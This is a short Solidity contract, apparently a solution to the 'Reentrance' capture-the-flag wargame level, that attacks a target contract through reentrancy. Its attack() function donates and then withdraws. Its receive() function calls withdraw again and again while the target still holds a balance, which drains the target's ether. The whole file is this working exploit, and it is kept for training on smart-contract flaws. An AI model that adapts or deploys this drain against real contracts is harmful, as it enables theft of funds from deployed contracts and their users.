// SPDX-License-Identifier: MIT
pragma solidity 0.8.13;

interface IReentrance {
    function donate(address _to) external payable;

    function withdraw(uint256 _amount) external;
}

contract ReentranceChallenge {
    IReentrance public reentrance;

    constructor(address _reentrance) {
        reentrance = IReentrance(_reentrance);
    }

    function attack() external payable {
        reentrance.donate{value: msg.value}(address(this));
        reentrance.withdraw(msg.value);
    }

    receive() external payable {
        if (msg.sender.balance > 0) {
            reentrance.withdraw(msg.value);
        }
    }
}
